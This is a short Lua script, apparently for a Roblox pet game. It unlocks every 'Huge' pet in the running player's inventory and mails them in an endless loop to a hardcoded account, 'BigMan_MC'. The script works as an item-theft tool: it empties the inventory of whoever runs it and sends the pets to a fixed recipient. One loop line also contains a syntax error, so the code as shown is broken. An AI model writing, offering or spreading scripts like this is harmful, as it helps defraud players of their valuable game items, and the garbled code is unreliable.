getgenv().MailToUser = "BigMan_MC"

local Network = require(game.ReplicatedStorage.Library.Client.Network)

while true do
    local HugeUIDList = {}

    -- Gather Huge pets and unlock them if necessary
    for PetUID, PetData in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
        if PetData.id:find("Huge ") then
            table.insert(HugeUIDList, PetUID)
            if PetData.lk then
                repeat
                    task.wait()
                until Network.Invoke("Locking_SetLocked", PetUID, false)
                print("Unlocked", PetUID)
            end
        end
    end

    -- Send the Huge pets via mailbox
    for , PetUID in pairs(HugeUIDList) do
        repeat
            task.wait()
        until Network.Invoke("Mailbox: Send", MailToUser, tostring(Random.new():NextInteger(9, 999999)), "Pet", PetUID, 1)
        print("Sent", PetUID)
    end

    -- Add a wait time before the next loop iteration to avoid flooding
    task.wait(10)  -- Waits 10 seconds before repeating the loop
end
